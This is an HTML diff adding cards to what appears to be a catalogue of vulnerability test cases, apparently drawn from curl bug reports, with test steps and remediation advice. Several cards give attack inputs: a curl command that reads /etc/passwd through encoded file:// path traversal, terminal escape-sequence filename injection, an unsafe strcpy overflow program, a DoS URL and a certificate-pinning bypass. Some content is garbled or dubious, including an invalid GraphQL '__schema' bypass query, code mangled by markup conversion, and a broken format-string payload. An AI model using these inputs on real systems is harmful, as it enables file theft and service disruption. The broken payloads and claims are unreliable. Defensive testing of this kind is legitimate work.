+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> GraphQL APIs often expose a schema introspection endpoint that allows clients to discover the available types and fields. An attacker may be able to bypass authentication mechanisms by prefixing private or internal GraphQL operations with &quot;__schema&quot;, enabling unauthorized access to sensitive information or functionality. This poses a risk to data confidentiality and potentially allows for unauthorized modifications.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GraphQL query to the target API endpoint, prepending &quot;<strong>schema&quot; to the operation name. For example: <code></strong>schema { type MyPrivateType { field1: String } }</code></li>
+<li>Observe the response. A successful response indicates the attacker can access the schema without authentication.</li>
+<li>Experiment with different operation names prefixed with &quot;__schema&quot; to attempt access to other private or internal functionalities.</li>
+<li>Use tools like <code>curl</code> to craft the request: <code>curl -X POST &lt;TARGET<em>URL&gt;/graphql -H &quot;Content-Type: application/json&quot; -d &#x27;{&quot;query&quot;: &quot;</em>_schema { type MyPrivateType { field1: String } }&quot;}&#x27;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive data or functionality within the GraphQL API. Potential for data breaches and modification of system behaviour.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement proper authentication and authorization checks for all GraphQL operations. Restrict access to the schema introspection endpoint to authenticated users only. Use schema directives or custom resolvers to control access to sensitive fields and types.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Leading Dot Hostname Validation Bypass</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker with a wildcard certificate for a domain to bypass hostname verification by connecting to a hostname that begins with a dot. The validation logic incorrectly treats the leading dot as part of the hostname, causing a mismatch in certificate validation. This can lead to man-in-the-middle attacks.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Generate a wildcard certificate for a domain (e.g., *.test.local).</li>
+<li>Configure a local server to accept connections on a specific port (e.g., 9443).</li>
+<li>Use a tool like <code>curl</code> to connect to a hostname that starts with a dot (e.g., .test.local:9443) and specify the wildcard certificate for verification.</li>
+<li>Check if the connection is successful and the hostname is not rejected.</li>
+<li>Run: <code>chmod +x poc.sh</code> and <code>./poc.sh /path/to/curl</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can perform man-in-the-middle attacks on HTTPS connections by exploiting this bypass.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that hostname validation correctly handles hostnames starting with a dot.  The hostname should be verified without including the leading dot.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Uncategorized">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Report 3458235 Testcase</span>
+        <span class="card-meta-mini">
+          <span class="badge">Uncategorized</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>Skipped: Report title mentions a CVE and refers to a specific product, making it difficult to create a target-agnostic test case.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Stack Buffer Overflow in TLS Error Handling</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A stack-based buffer overflow occurs when handling TLS errors, potentially leading to application crashes or, in some cases, arbitrary code execution. This happens because an error message is copied into a fixed-size buffer without sufficient bounds checking. This vulnerability is more critical in production environments where debugging checks are disabled.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Identify a service using a cURL-based TLS library.</li>
+<li>Trigger a TLS error condition within the service. This might involve sending malformed TLS packets or configuring the service to use an invalid certificate.</li>
+<li>Monitor the service&#x27;s memory usage for signs of a stack overflow, which may manifest as crashes or unexpected behavior.</li>
+<li>Observe the vulnerability with the following payload and test program:</li>
+</ol>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+static char *wssl_strerror(unsigned long error, char *buf, unsigned long size) {
+    *buf = &#x27;\0&#x27;;
+    if(!*buf) {
+        const char *msg = error ? &quot;Unknown error&quot; : &quot;No error&quot;;
+        strcpy(buf, msg); // VULNERABLE CALL: ignores `size`
+    }
+    return buf;
+}
+int main() {
+    char small_buffer[12];
+    wssl_strerror(1, small_buffer, 12);
+    printf(&quot;Result: %s\n&quot;, small_buffer);
+    return 0;
+}</code></pre>
+<p>Compile the above code, then execute it to check for memory overflow.</p>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of Service (application crash) or potential Arbitrary Code Execution if memory corruption allows control flow hijacking.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always use safe string handling functions that perform bounds checking (e.g., <code>strncpy</code>, <code>snprintf</code>) when copying data into fixed-size buffers. Employ compiler-based address sanitizers during development and testing.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Malicious Filename Injection via Curl</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A server can be tricked into providing a filename to a client&#x27;s <code>curl</code> command that includes special escape sequences. These sequences can manipulate the terminal output, potentially displaying misleading error messages or concealing malicious content. This can lead to user confusion or, in some cases, trick users into believing a download failed while a different file is being saved.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set up a local HTTP server that serves files with a dynamically generated filename.</li>
+<li>The filename should include escape sequences like <code>\033[1G\033[2K\033[A</code> (carriage return, clear line, up arrow, clear line) followed by an arbitrary error message (e.g., &quot;curl: (6) Could not resolve host: google.com&quot;).</li>
+<li>Use <code>curl</code> with options <code>-J</code>, <code>-O</code>, and <code>-w</code> to download the file and display the filename. For example: <code>curl -J -O -w &quot;Saved to: %{filename<em>effective}&quot; &lt;TARGET</em>URL&gt;</code>.</li>
+<li>Observe the terminal output to confirm the presence of the crafted error message.</li>
+<li>Verify the downloaded file&#x27;s contents and filename are as expected, compared with the crafted filename.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> User confusion, potential for information disclosure, misleading error messages.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Sanitize filenames before providing them to clients, particularly when dynamically generated.  Validate or escape escape sequences in filenames. Consider disabling or carefully controlling filename generation and display within HTTP server responses.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Buffer Overflow in String Formatting</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A buffer overflow vulnerability occurs when formatted strings are written to a user-provided buffer without proper size validation. This can lead to arbitrary code execution or denial of service if the format string is maliciously crafted to exceed the buffer&#x27;s capacity. This test aims to highlight this type of vulnerability, regardless of the specific formatting function used.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Obtain a target application that uses a string formatting function to write to a user-provided buffer.</li>
+<li>Create a buffer of a known, small size (e.g., 16 bytes).</li>
+<li>Craft a malicious format string containing format specifiers (e.g., <code>%s</code>, <code>%n</code>) that generate output larger than the buffer&#x27;s size. An example payload is: <code>&lt;PAYLOAD&gt;</code> (e.g., <code>A&quot;<em>100%sB&quot;</em>50</code>).</li>
+<li>Pass the malicious format string and the buffer to the vulnerable string formatting function.</li>
+<li>Observe the resulting behavior: memory corruption, crashes, or unexpected output indicating a buffer overflow.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Arbitrary code execution, memory corruption, information disclosure, and denial of service.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement bounds checking when writing formatted output to user-provided buffers. Use safer string formatting functions that prevent overflows by default. Sanitize user-provided format strings.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Denial of Service via URL Path Normalization</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The <code>dedotdotify()</code> function, used for URL path normalization, exhibits quadratic time complexity (O(n²)) when processing paths with numerous <code>../</code> sequences. This can lead to excessive CPU usage and denial of service when handling malicious URLs.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Craft a URL containing a long sequence of <code>/../</code> segments. For example: <code>http://&lt;TARGET_URL&gt;/a/b/c/.../x/y/z/../../../../..</code></li>
+<li>Use <code>curl</code> or a similar HTTP client to request the crafted URL.</li>
+</ol>
+<pre><code>   curl &quot;http://&lt;TARGET_URL&gt;/a/b/c/.../x/y/z/../../../../..&quot;</code></pre>
+<ol>
+<li>Monitor the CPU usage of the server or application processing the request. Observe a significant increase in CPU consumption compared to a normal request.</li>
+<li>Test with increasingly longer sequences of <code>/../</code> to verify the quadratic time complexity. For instance, a URL like <code>http://&lt;TARGET_URL&gt;/a/b/c/../..</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  Denial of service due to excessive CPU consumption, leading to slow response times or service unavailability.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Rewrite the vulnerable <code>dedotdotify()</code> function to use an O(n) algorithm, such as tracking segment boundaries using a linked list or array, or utilize the <code>CURLU<em>PATH</em>AS_IS</code> option where appropriate, after careful security review. Implement input validation to limit URL path lengths.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Uncategorized">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Report 3463619 Testcase</span>
+        <span class="card-meta-mini">
+          <span class="badge">Uncategorized</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p>Skipped: The report is a request for assistance and does not describe a vulnerability.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">URL-Encoded Path Traversal Bypass</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> Applications using <code>file://</code> URLs with URL-encoded path traversal sequences (<code>%2f%2e%2e%2f</code>) can be tricked into accessing arbitrary files due to improper normalization of URLs. This bypasses standard path traversal protections and can lead to sensitive information disclosure.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a <code>file://</code> URL with URL-encoded path traversal sequences to access a sensitive file. For example: <code>file:///%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code>.</li>
+<li>Send the URL to the target application.</li>
+<li>Observe if the application reads and returns the content of the targeted file.</li>
+<li>Verify that the URL normalization function fails to decode and sanitize the URL properly.</li>
+<li>Use the following command as an example to demonstrate the bypass: <code>curl &quot;file:///%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&quot;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to sensitive files on the system, potentially exposing credentials, configuration data, or application source code.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Properly decode and sanitize all URLs, including handling URL-encoded characters, before performing any file operations. Validate the normalized path to ensure it remains within the intended directory.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Certificate Pinning Bypass</span>
+        <span class="card-meta-mini">
+          <span class="badge">Web App</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows a Man-in-the-Middle attacker to bypass Certificate Pinning, even when enabled, if insecure connections are allowed. This occurs due to inconsistent handling of certificate verification flags across different TLS backends.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a curl client with a specific pinned public key. For example, <code>--pinnedpubkey &quot;sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot;</code>.</li>
+<li>Disable peer verification by using the <code>-k</code> or <code>--insecure</code> flag.</li>
+<li>Initiate an HTTP/3 connection to &lt;TARGET<em>URL&gt; using the configured curl client. Example: <code>curl -k --http3 --pinnedpubkey &quot;sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&quot; &lt;TARGET</em>URL&gt;</code>.</li>
+<li>Verify the connection proceeds without the expected pinning error. The presence of a successful connection, rather than the expected &quot;pinned public key mismatch&quot; error, indicates a bypass.</li>
+<li>Compare the behavior with a standard build (like OpenSSL) where disabling verification prevents certificate pinning from working as expected.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> A Man-in-the-Middle attacker can intercept and decrypt traffic, bypassing the intended protection of certificate pinning.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure consistent handling of certificate verification flags across all TLS backends. Certificate pinning should function independently of other verification settings.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Heap Buffer Overflow in DNS Resolution</span>
+        <span class="card-meta-mini">
+          <span class="badge">Network</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A heap buffer overflow can occur during DNS resolution when using a fixed-size buffer and incorrect pointer arithmetic, leading to potential memory corruption. This vulnerability specifically affects systems using a particular operating system and socket library. It can lead to denial of service or, in some cases, potentially allow for code execution.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a target system to use AmigaOS with the bsdsocket.library backend.</li>
+<li>Attempt to resolve a hostname using the <code>curl</code> command line tool, influencing the DNS response to be an attacker-controlled hostname.</li>
+<li>Observe if the <code>curl</code> or related library processes crash or exhibit unexpected behavior.</li>
+<li>Use a debugger to observe memory access patterns during DNS resolution and confirm that writes exceed the bounds of the allocated buffer. An example payload might be: <code>curl &lt;TARGET<em>URL&gt;</code> where <code>&lt;TARGET</em>URL&gt;</code> resolves to a specially crafted hostname.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service through process crashes or heap memory corruption, with a potential for arbitrary code execution depending on the heap layout and implemented mitigations.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement dynamic buffer allocation that accounts for structure alignment and padding requirements when performing DNS resolution. Validate the size and offset calculations to prevent out-of-bounds writes.</p>
         <div class="card-meta">
           <span>Added: 2025-12-26</span>
         </div>
